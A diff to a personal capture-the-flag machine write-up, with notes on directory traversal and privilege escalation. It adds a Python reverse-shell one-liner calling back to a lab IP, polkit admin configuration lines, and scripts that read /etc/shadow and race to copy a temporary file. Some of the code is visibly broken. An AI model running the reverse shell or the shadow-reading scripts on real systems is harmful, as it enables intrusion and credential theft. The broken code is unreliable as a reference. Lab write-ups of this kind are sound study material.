@@ -311,16 +311,18 @@ else:
 
 ## Where I Got Stuck?  
 
+* I got stuck on the privilege escalation part. It did not occur to me that it could be accomplished by writing a script right away.
    
 
 ## What Did I learn from this Machine?  
 
+* Directory Traversal
 
 
 
 ## Writeups   
   
-
+* continue watching the ippsec walkthrough and write notes.
 
 
 
@@ -369,5 +371,57 @@ print(key)
 ```
 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.61",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
 ```
+
+[Configuration]
+AdminIdentities=unix-user:0
+[Configuration]
+AdminIdentities=unix-group:sudo;unix-group:admin
+
+
+```python
+# Try 1
+#!/env/.../python forgot
+while True:
+  if len(os.listDir('/tmp/SSH')) > 0:
+    with open('/etc/shadow', 'r') as f:
+    data = f.readlines()
+    data = [(p.split(":") if "$" in p else None) for p in data]
+    passwords = []
+    for x in data:
+    if not x == None:
+      passwords.append(x)
+
+    passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
+    with open('/tmp/SSH/'+path, 'w') as f:
+    f.write(passwordFile)
+    break
+```
+
+
+* The code I used to get the contents of the file that has the contents of the shadow file before it gets removed  
+
+```python
+#!/usr/bin/env python3 
+  
+import os
+import time
+
+while True:
+    if len(os.listdir('/tmp/SSH')) > 0:
+        time.sleep(.05)
+        with open('/tmp/SSH/'+os.listdir('/tmp/SSH')[0], 'r') as f:
+            data = f.readlines()
+        passwords = []
+        for x in data:
+            if not x == None:
+                passwords.append(x)
+
+        #passwordFile = '\n'.join(['\n'.join(p) for p in passwords])
+        with open('/tmp/passes', 'w') as f:
+            f.write(passwords)
+        break
+```
+
+
 
 <!-- tagsss -->
